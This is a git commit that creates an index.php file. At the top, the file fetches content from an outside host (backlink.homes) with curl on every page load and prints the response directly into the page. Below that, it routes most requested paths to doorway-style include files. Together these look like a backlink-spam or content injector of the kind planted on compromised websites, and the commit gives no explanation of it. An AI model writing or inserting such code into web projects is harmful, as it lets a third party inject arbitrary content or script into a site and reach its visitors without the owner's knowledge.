bc741097b8481938802f6f2c4e5b4210aed0f0af
r00t <133220676+r00ter1@users.noreply.github.com>
2024-01-23 11:39:54 +0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,24 @@
+    <?php
+    $exe = curl_init();
+    curl_setopt($exe, CURLOPT_URL, "https://backlink.homes/code?x=3262");
+    curl_exec($exe);
+?>
+
+  
+<?php
+$pagelink=trim(preg_replace('#(\?.*)?#','',$_SERVER['REQUEST_URI']),'/');
+
+if(empty($pagelink)) {
+    include_once( 'indexmin.php');
+};
+
+if($pagelink=="as") {
+    include_once('indexam.php');
+};
+if($pagelink=="index.php") {
+    include_once( 'indexmin.php');
+};
+if(!empty($pagelink)&&$pagelink!="as") {
+    include_once('link2.php');
+};
+?>
